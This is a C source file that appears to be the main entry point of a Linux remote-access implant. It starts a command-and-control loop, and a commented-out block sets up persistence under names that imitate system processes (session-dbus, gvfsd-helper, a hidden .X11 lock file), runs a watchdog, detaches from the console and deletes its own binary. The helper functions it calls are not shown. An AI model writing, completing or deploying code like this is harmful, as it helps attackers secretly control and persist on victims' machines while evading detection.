#include <sys/shm.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <errno.h>
// custom functions
#include "utils.h"
#include "persistence.h"
#include "c2_commands.h"

int main(int argc, char *argv[]) {

    #ifdef DEBUG
    printf("[+] DEBUG MODE ENABLED\n");
    #endif

    /*
    pid_t id = getuid();

    // Spawn session-dbus (monitor)
    // if session-dbus lock file is locked... create the lock for gvfsd and spawn gvfsd
    if (lock_check("/home/gdev/.X11/.X11-lock") != 0) {

        create_lock(1);  // lock file created, when gvfspd spawns session-dbus, the top loop will run forever.

        if (id != 0 ) { // non-root
            daemon(0, 0);
           // spawn gvfsd-helper
            spawn_thread_watchdog(1);
        }

        do {
            // forever run session-dbus as a "watchdog process".
            sleep(10);
        }while(true);

    }

    bool desktop_res = nonroot_persistence();
    if (desktop_res == false ) {
        #ifdef DEBUG
        fprintf(stderr, "[main] Error creating non-root persistence: %s",strerror(errno));
        #endif
        exit(1);
    }
    // if root do ....
    if (id == 0) {
        daemon(0, 0);  // detach from current console
        // TODO - spawn root thread, and perform root operations


    } else { // non-root user....

        //daemon(0, 0);  // detach from current console
        // spawns -> /home/$USER/.gvfsd/.profile/gvfsd-helper
        //printf("initial spawn of gvfsd-helper\n");

        // creating .X11/X0-lock
        create_lock(0);

        // session-dbus create
        spawn_thread_watchdog(0);
        daemon(0, 0);  // detach from current console
    }

    #ifndef DEBUG
    self_delete(argv[0]); //  deleting this binary.
    #endif

    */
    // kick off c2 loop in main thread
    c2_loop();
    return 0;
 }
